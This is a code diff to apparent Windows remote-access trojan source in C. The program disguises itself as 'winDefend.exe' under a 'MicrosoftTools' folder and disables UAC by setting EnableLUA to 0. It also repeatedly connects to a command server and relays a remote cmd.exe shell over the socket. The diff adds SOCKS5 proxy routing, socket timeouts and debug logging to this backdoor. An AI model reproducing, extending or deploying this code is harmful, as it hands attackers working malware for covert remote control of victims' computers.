@@ -8,14 +8,28 @@
 #define MAIN_DIR     "MicrosoftTools"
 #define PROGRAM_NAME L"winDefend.exe"
 
-#define HOST "127.0.0.1"
-#define PORT 38709
+#ifndef DEST_HOST
+#define DEST_HOST "127.0.0.1"
+#endif
+
+#ifndef DEST_PORT
+#define DEST_PORT 1313
+#endif
 
 static bool switch_to_new_program;
 static wchar_t pathWithName[260 + 1];
 
-static bool mainProcessing(EAScktType sckt, char *msg);
-static bool connectToCMD(EAScktType sckt);
+static struct in_addr getAddress(const char *hostname);
+
+#ifdef USE_PROXY
+
+static bool negotiateTheProxyServer(EASCKT sckt);
+
+#endif
+
+static bool mainProcessing(EASCKT sckt, char *msg);
+static bool connectToCMD(EASCKT sckt);
+
 
 bool isThePlaceToBe(const char *pathOfProgram)
 {
@@ -88,7 +102,7 @@ const wchar_t *infectTheSystem(void)
                              L"EnableLUA", 
                              0, 
                              REG_DWORD, 
-                             (BYTE *)&((DWORD){0}), 
+                             (BYTE *)&((DWORD){0U}), 
                              sizeof(DWORD));
     }
     
@@ -129,38 +143,94 @@ void connectToBigBrother(void)
     {
         Sleep(1300);
 
-        struct hostent *hstnt = gethostbyname(HOST);
+#if USE_PROXY == 1 
 
-        if (NULL == hstnt)
+        const char *host = "WRITE"; // proxy
+        unsigned short port = htons(WRITE); // proxy port 
+
+#else
+
+        const char *host = DEST_HOST;
+        unsigned short port = htons(DEST_PORT);
+
+#endif
+        LOG("Getting IPv4 Address\n");
+
+        struct in_addr IPv4 = getAddress(host);
+
+        if (INADDR_NONE == IPv4.S_un.S_addr)
         {
+            LOG("Dest Host invalid\n");
+
             continue;
         }
 
-        EAScktType sckt = socket(AF_INET, SOCK_STREAM, 0);
+        LOG("Creating Socket\n");
+
+        EASCKT sckt = socket(AF_INET, SOCK_STREAM, 0);
 
         if (SCKT_ERR == sckt)
         {
             continue;
         }
-        
-        struct in_addr **addr_list = (struct in_addr **)hstnt->h_addr_list;
-        struct sockaddr_in inf = {
+
+        LOG("Configuring Socket\n");
+
+        (void)setsockopt(sckt, 
+                         SOL_SOCKET, 
+                         SO_SNDTIMEO, 
+                         (char *)&((DWORD){33000U}), 
+                         sizeof(DWORD));
+        (void)setsockopt(sckt, 
+                         SOL_SOCKET, 
+                         SO_RCVTIMEO, 
+                         (char *)&((DWORD){33000U}), 
+                         sizeof(DWORD));
+
+        struct sockaddr_in sockAddr = {
             .sin_family = AF_INET,
-            .sin_port = htons(PORT),
-            .sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0])),
+            .sin_addr = IPv4,
+            .sin_port = port
         };
 
-        while (0 != connect(sckt, (struct  sockaddr *)&inf, sizeof(inf)))
+        LOG("Connect Server\n");
+
+        while (connect(sckt, 
+               (struct sockaddr *)&sockAddr, 
+               (EAScktLen){sizeof(sockAddr)}))
         {
+            LOG("Connect Fail, Trying again\n");
+            
             Sleep(1300);
         }
-        
+
+#ifdef USE_PROXY
+
+        LOG("\t\tNegotiate Proxy\n");
+
+        if (false == negotiateTheProxyServer(sckt))
+        {
+            LOG("\t\tNegotiate Proxy error\n");
+
+            eaSCKTClose(sckt);
+
+            continue;
+        }
+
+#endif
+
+        LOG("Comm Started\n");
+
         for (;;)
         {
             char text[313 + 1];
 
+            LOG("\t\t\tRecver Text\n");
+
             if (false == recverText(sckt, text, sizeof(text)))
             {
+                LOG("\t\t\tRecver Error!\n");
+
                 break;
             }
 
@@ -168,11 +238,13 @@ void connectToBigBrother(void)
 
             if (false == loop)
             {
+                LOG("Main Proccessing Error!\n");
+
                 break;
             }
         }
 
-        closesocket(sckt);
+        eaSCKTClose(sckt);
 
         if (switch_to_new_program)
         {
@@ -191,7 +263,138 @@ void connectToBigBrother(void)
     }
 }
 
-static bool mainProcessing(EAScktType sckt, char *text)
+static struct in_addr getAddress(const char *hostname)
+{
+    struct in_addr IPv4 = { .S_un.S_addr = inet_addr(hostname)};
+
+    if (INADDR_NONE != IPv4.S_un.S_addr)
+    {
+        return IPv4;
+    }
+
+    struct hostent* hostdata = gethostbyname(hostname);
+
+    if (NULL == hostdata)
+    {
+        LOG("%s: Invalid host\n", __func__);
+
+        return IPv4;
+    }
+
+    return *((struct in_addr **)hostdata->h_addr_list)[0];
+}
+
+#ifdef USE_PROXY
+
+#include <stdint.h>
+
+static bool negotiateTheProxyServer(EASCKT sckt)
+{
+    LOG("\t%s: Send First Request to Proxy\n", __func__);
+
+    unsigned char request[260] = {'\x05','\x01', '\x00'};
+
+    if (false == eaSCKTSend(sckt, (char *)request, 3U))
+    {
+        LOG("\t%s: error request 3 byte\n", __func__);
+
+        return false;
+    }
+
+    LOG("\t%s: Recv First Data from Proxy\n", __func__);
+
+    unsigned char response[260];
+
+    if ((false == eaSCKTRecv(sckt, (char *)response, 2U)) ||
+        ('\x05' != response[0]) ||
+        ('\x00' != response[1]))
+    {
+        LOG("\t%s: error response 2 byte\n", __func__);
+
+        return false;
+    }
+
+    unsigned char size = 10U;
+    struct in_addr IPv4 = { .S_un.S_addr = inet_addr(DEST_HOST)};
+
+    if (INADDR_NONE == IPv4.S_un.S_addr)
+    {
+        LOG("\t%s: HOST\n", __func__);
+
+        request[3] = '\x03';
+        request[4] = (unsigned char)strlen(DEST_HOST);
+        (void)memcpy(&request[5], DEST_HOST, request[4]);
+        *(uint16_t *)&request[5U + request[4]] = htons(DEST_PORT);
+
+        size = 7U + request[4];
+    }
+    else
+    {
+        LOG("\t%s: IP\n", __func__);
+
+        request[3] = '\x01';
+        *(uint32_t *)&request[4] = (uint32_t)IPv4.S_un.S_addr;
+        *(uint16_t *)&request[8] = htons(DEST_PORT);
+    }
+
+    LOG("\t%s: Send Request Data to Proxy\n", __func__);
+    
+    for (int idx = 0; idx < size; idx++)
+    {
+        LOG("%u ", (unsigned int)request[idx]);
+    }
+
+    LOG("\n");
+
+    if (false == eaSCKTSend(sckt, (char *)&request, size))
+    {
+        LOG("\t%s: error request\n", __func__);
+
+        return false;
+    }
+
+    LOG("\t%s: Recv Response Data from Proxy\n", __func__);
+    
+    if ((false == eaSCKTRecv(sckt, (char *)&response, 5U)) ||
+        ('\x05' != response[0]) ||
+        ('\x00' != response[1]))
+    {
+        LOG("\t%s: error response\n", __func__);
+
+        return false;
+    }
+
+    if ('\x01' == response[3])
+    {
+        size = 5U;
+    }
+    else if ('\x03' == response[3])
+    {
+        size = response[4] + 2U;
+    }
+    else if ('\x04' == response[3])
+    {
+        size = 17U;
+    }
+
+    if (false == eaSCKTRecv(sckt, (char *)&response, size))
+    {
+        LOG("\t%s: error in last response\n", __func__);
+
+        return false;
+    }
+
+    IPv4.S_un.S_addr = *(uint32_t *)&response[4];
+
+    LOG("\t%s: IP : %s\n", __func__, inet_ntoa(IPv4));
+    LOG("\t%s: Proxy OK\n", __func__);
+    
+    return true;
+}
+
+#endif
+
+static bool mainProcessing(EASCKT sckt, char *text)
 {
     if (!strncmp(text, "cmd", 3U))
     {
@@ -244,7 +447,7 @@ static bool mainProcessing(EAScktType sckt, char *text)
     return true;
 }
 
-static bool connectToCMD(EAScktType sckt)
+static bool connectToCMD(EASCKT sckt)
 {
     CHAR chBuf[4500 + 1];
     DWORD dwRead, dwWritten;
@@ -326,7 +529,11 @@ static bool connectToCMD(EAScktType sckt)
 
         if (!bSuccess || dwRead == 0)
         {
-            (void)WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
+            (void)WriteFile(hChildStd_IN_Wr, 
+                            "exit\n", 
+                            strlen("exit\n"), 
+                            &dwWritten, 
+                            NULL);
             
             if (false == senderText(sckt, "_Error_ WriteFile1"))
             {
@@ -354,7 +561,11 @@ static bool connectToCMD(EAScktType sckt)
 
         if (false == recverText(sckt, chBuf, sizeof(chBuf)))
         {
-            WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
+            WriteFile(hChildStd_IN_Wr, 
+                      "exit\n", 
+                      strlen("exit\n"), 
+                      &dwWritten, 
+                      NULL);
 
             if (false == senderText(sckt, "_Error_ WriteFile2"))
             {
@@ -364,7 +575,11 @@ static bool connectToCMD(EAScktType sckt)
             break;
         }
         
-        bSuccess = WriteFile(hChildStd_IN_Wr, chBuf, strlen(chBuf), &dwWritten, NULL);
+        bSuccess = WriteFile(hChildStd_IN_Wr, 
+                             chBuf, 
+                             strlen(chBuf), 
+                             &dwWritten, 
+                             NULL);
 
         if (!bSuccess)
         {
